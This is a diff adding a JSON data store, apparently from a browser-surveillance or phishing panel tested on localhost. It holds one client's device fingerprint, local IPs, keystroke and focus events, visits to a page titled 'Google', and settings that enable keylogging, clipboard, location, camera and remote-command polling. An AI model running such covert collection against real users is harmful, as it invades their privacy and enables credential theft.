@@ -1,0 +1,384 @@
+{
+  "clients": {
+    "ckj1g6fmmah6hdd": {
+      "firstSeen": "2026-03-03T14:03:21.370Z",
+      "lastSeen": "2026-03-03T14:12:30.200Z",
+      "online": false,
+      "ip": "127.0.0.1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
+      "screen": "1440x1080",
+      "battery": 100,
+      "charging": true,
+      "networkType": "4g",
+      "downlink": 3.7,
+      "saveData": false,
+      "language": "nl",
+      "timezone": "Europe/Amsterdam",
+      "isIdle": true,
+      "idleSecs": 22,
+      "tabHidden": true,
+      "hiddenMs": 80563,
+      "maxScrollPct": 0,
+      "deviceInfo": {
+        "platform": "Win32",
+        "language": "nl",
+        "languages": "nl, en, en-GB, en-US",
+        "cookiesEnabled": true,
+        "doNotTrack": "1",
+        "hardwareConcurrency": 16,
+        "maxTouchPoints": 0,
+        "screenW": 1440,
+        "screenH": 1080,
+        "screenAvailW": 1440,
+        "screenAvailH": 1032,
+        "colorDepth": 32,
+        "pixelRatio": 1,
+        "windowW": 1432,
+        "windowH": 948,
+        "timezone": "Europe/Amsterdam",
+        "timezoneOffset": -60,
+        "online": true,
+        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
+        "vendor": "Google Inc.",
+        "pdfViewerEnabled": true,
+        "canvasFingerprint": "AA//92sF8JAAAABklEQVQDAIhPr/vmubT1AAAAAElFTkSuQmCC",
+        "batteryLevel": 100,
+        "batteryCharging": true,
+        "networkType": "4g",
+        "downlink": 10,
+        "rtt": 100,
+        "saveData": false,
+        "deviceMemory": 8,
+        "storageQuota": 567931,
+        "storageUsage": 0,
+        "cameras": 1,
+        "microphones": 3,
+        "speakers": 3,
+        "gpuVendor": "Google Inc. (NVIDIA)",
+        "gpuRenderer": "ANGLE (NVIDIA, NVIDIA GeForce RTX 3050 Laptop GPU (0x000025A2) Direct3D11 vs_5_0 ps_5_0, D3D11)",
+        "localIPs": "192.168.56.1, 192.168.178.102",
+        "audioFingerprint": "160453.11",
+        "plugins": "PDF Viewer, Chrome PDF Viewer, Chromium PDF Viewer, Microsoft Edge PDF Viewer, WebKit built-in PDF",
+        "ip": "127.0.0.1",
+        "timestamp": "2026-03-03T14:10:29.632Z"
+      }
+    }
+  },
+  "locations": [],
+  "media": [],
+  "photos": [],
+  "errors": [],
+  "events": [
+    {
+      "type": "client_disconnected",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd"
+      },
+      "timestamp": "2026-03-03T14:12:56.369Z"
+    },
+    {
+      "type": "client_disconnected",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd"
+      },
+      "timestamp": "2026-03-03T14:12:26.341Z"
+    },
+    {
+      "type": "keystrokes",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "length": 27,
+        "url": "http://localhost:3000/"
+      },
+      "timestamp": "2026-03-03T14:12:08.199Z"
+    },
+    {
+      "type": "keystrokes",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "length": 40,
+        "url": "http://localhost:3000/"
+      },
+      "timestamp": "2026-03-03T14:11:09.660Z"
+    },
+    {
+      "type": "page_visit",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "url": "http://localhost:3000/",
+        "title": "Google"
+      },
+      "timestamp": "2026-03-03T14:11:07.948Z"
+    },
+    {
+      "type": "page_visit",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "url": "http://localhost:3000/",
+        "title": "Google"
+      },
+      "timestamp": "2026-03-03T14:11:07.493Z"
+    },
+    {
+      "type": "keystrokes",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "length": 65,
+        "url": "http://localhost:3000/"
+      },
+      "timestamp": "2026-03-03T14:11:07.273Z"
+    },
+    {
+      "type": "keystrokes",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "length": 30,
+        "url": "http://localhost:3000/"
+      },
+      "timestamp": "2026-03-03T14:11:06.440Z"
+    },
+    {
+      "type": "device_info",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "platform": "Win32",
+        "ip": "127.0.0.1"
+      },
+      "timestamp": "2026-03-03T14:10:29.632Z"
+    },
+    {
+      "type": "device_info",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "platform": "Win32",
+        "ip": "127.0.0.1"
+      },
+      "timestamp": "2026-03-03T14:09:29.620Z"
+    },
+    {
+      "type": "device_info",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "platform": "Win32",
+        "ip": "127.0.0.1"
+      },
+      "timestamp": "2026-03-03T14:08:29.629Z"
+    },
+    {
+      "type": "device_info",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "platform": "Win32",
+        "ip": "127.0.0.1"
+      },
+      "timestamp": "2026-03-03T14:07:29.617Z"
+    },
+    {
+      "type": "device_info",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "platform": "Win32",
+        "ip": "127.0.0.1"
+      },
+      "timestamp": "2026-03-03T14:06:29.615Z"
+    },
+    {
+      "type": "device_info",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "platform": "Win32",
+        "ip": "127.0.0.1"
+      },
+      "timestamp": "2026-03-03T14:05:29.624Z"
+    },
+    {
+      "type": "keystrokes",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "length": 64,
+        "url": "http://localhost:3000/"
+      },
+      "timestamp": "2026-03-03T14:04:42.249Z"
+    },
+    {
+      "type": "device_info",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "platform": "Win32",
+        "ip": "127.0.0.1"
+      },
+      "timestamp": "2026-03-03T14:04:29.622Z"
+    },
+    {
+      "type": "keystrokes",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "length": 64,
+        "url": "http://localhost:3000/"
+      },
+      "timestamp": "2026-03-03T14:03:40.428Z"
+    },
+    {
+      "type": "keystrokes",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "length": 64,
+        "url": "http://localhost:3000/"
+      },
+      "timestamp": "2026-03-03T14:03:35.815Z"
+    },
+    {
+      "type": "device_info",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "platform": "Win32",
+        "ip": "127.0.0.1"
+      },
+      "timestamp": "2026-03-03T14:03:29.621Z"
+    },
+    {
+      "type": "client_connected",
+      "data": {
+        "clientId": "ckj1g6fmmah6hdd",
+        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
+        "ip": "127.0.0.1"
+      },
+      "timestamp": "2026-03-03T14:03:21.370Z"
+    }
+  ],
+  "deviceInfo": {
+    "ckj1g6fmmah6hdd": {
+      "platform": "Win32",
+      "language": "nl",
+      "languages": "nl, en, en-GB, en-US",
+      "cookiesEnabled": true,
+      "doNotTrack": "1",
+      "hardwareConcurrency": 16,
+      "maxTouchPoints": 0,
+      "screenW": 1440,
+      "screenH": 1080,
+      "screenAvailW": 1440,
+      "screenAvailH": 1032,
+      "colorDepth": 32,
+      "pixelRatio": 1,
+      "windowW": 1432,
+      "windowH": 948,
+      "timezone": "Europe/Amsterdam",
+      "timezoneOffset": -60,
+      "online": true,
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
+      "vendor": "Google Inc.",
+      "pdfViewerEnabled": true,
+      "canvasFingerprint": "AA//92sF8JAAAABklEQVQDAIhPr/vmubT1AAAAAElFTkSuQmCC",
+      "batteryLevel": 100,
+      "batteryCharging": true,
+      "networkType": "4g",
+      "downlink": 10,
+      "rtt": 100,
+      "saveData": false,
+      "deviceMemory": 8,
+      "storageQuota": 567931,
+      "storageUsage": 0,
+      "cameras": 1,
+      "microphones": 3,
+      "speakers": 3,
+      "gpuVendor": "Google Inc. (NVIDIA)",
+      "gpuRenderer": "ANGLE (NVIDIA, NVIDIA GeForce RTX 3050 Laptop GPU (0x000025A2) Direct3D11 vs_5_0 ps_5_0, D3D11)",
+      "localIPs": "192.168.56.1, 192.168.178.102",
+      "audioFingerprint": "160453.11",
+      "plugins": "PDF Viewer, Chrome PDF Viewer, Chromium PDF Viewer, Microsoft Edge PDF Viewer, WebKit built-in PDF",
+      "ip": "127.0.0.1",
+      "timestamp": "2026-03-03T14:10:29.632Z"
+    }
+  },
+  "keystrokes": [
+    {
+      "id": "mmaoslfr",
+      "clientId": "ckj1g6fmmah6hdd",
+      "keys": "[USER IDLE for 60+ seconds]",
+      "url": "http://localhost:3000/",
+      "timestamp": "2026-03-03T14:12:08.199Z"
+    },
+    {
+      "id": "mmaorc9o",
+      "clientId": "ckj1g6fmmah6hdd",
+      "keys": "[WINDOW BLUR - user switched tab/window]",
+      "url": "http://localhost:3000/",
+      "timestamp": "2026-03-03T14:11:09.660Z"
+    },
+    {
+      "id": "mmaorafd",
+      "clientId": "ckj1g6fmmah6hdd",
+      "keys": "[NETWORK CHANGE] effectiveType=4g downlink=3.7Mbps saveData=false",
+      "url": "http://localhost:3000/",
+      "timestamp": "2026-03-03T14:11:07.273Z"
+    },
+    {
+      "id": "mmaor9s8",
+      "clientId": "ckj1g6fmmah6hdd",
+      "keys": "[WINDOW FOCUS - user returned]",
+      "url": "http://localhost:3000/",
+      "timestamp": "2026-03-03T14:11:06.440Z"
+    },
+    {
+      "id": "mmaoj1c9",
+      "clientId": "ckj1g6fmmah6hdd",
+      "keys": "[NETWORK CHANGE] effectiveType=4g downlink=10Mbps saveData=false",
+      "url": "http://localhost:3000/",
+      "timestamp": "2026-03-03T14:04:42.249Z"
+    },
+    {
+      "id": "mmaohpn0",
+      "clientId": "ckj1g6fmmah6hdd",
+      "keys": "[NETWORK CHANGE] effectiveType=4g downlink=10Mbps saveData=false",
+      "url": "http://localhost:3000/",
+      "timestamp": "2026-03-03T14:03:40.428Z"
+    },
+    {
+      "id": "mmaohm2v",
+      "clientId": "ckj1g6fmmah6hdd",
+      "keys": "[NETWORK CHANGE] effectiveType=4g downlink=10Mbps saveData=false",
+      "url": "http://localhost:3000/",
+      "timestamp": "2026-03-03T14:03:35.815Z"
+    }
+  ],
+  "clipboard": [],
+  "pageVisits": [
+    {
+      "id": "mmaoray4",
+      "clientId": "ckj1g6fmmah6hdd",
+      "url": "http://localhost:3000/",
+      "title": "Google",
+      "referrer": "",
+      "timestamp": "2026-03-03T14:11:07.948Z"
+    },
+    {
+      "id": "mmaoralh",
+      "clientId": "ckj1g6fmmah6hdd",
+      "url": "http://localhost:3000/",
+      "title": "Google",
+      "referrer": "",
+      "timestamp": "2026-03-03T14:11:07.493Z"
+    }
+  ],
+  "notes": {},
+  "tags": {},
+  "credentials": [],
+  "config": {
+    "photoEnabled": false,
+    "photoPeriod": 30000,
+    "photoQuality": 0.7,
+    "videoEnabled": false,
+    "videoPeriod": 300000,
+    "videoDuration": 10000,
+    "locationEnabled": true,
+    "locationPeriod": 15000,
+    "keystrokesEnabled": true,
+    "keyLogFlush": 10000,
+    "clipboardEnabled": true,
+    "clipboardCheck": 15000,
+    "deviceInfoPeriod": 60000,
+    "heartbeatPeriod": 8000,
+    "commandPoll": 3000
+  }
+}
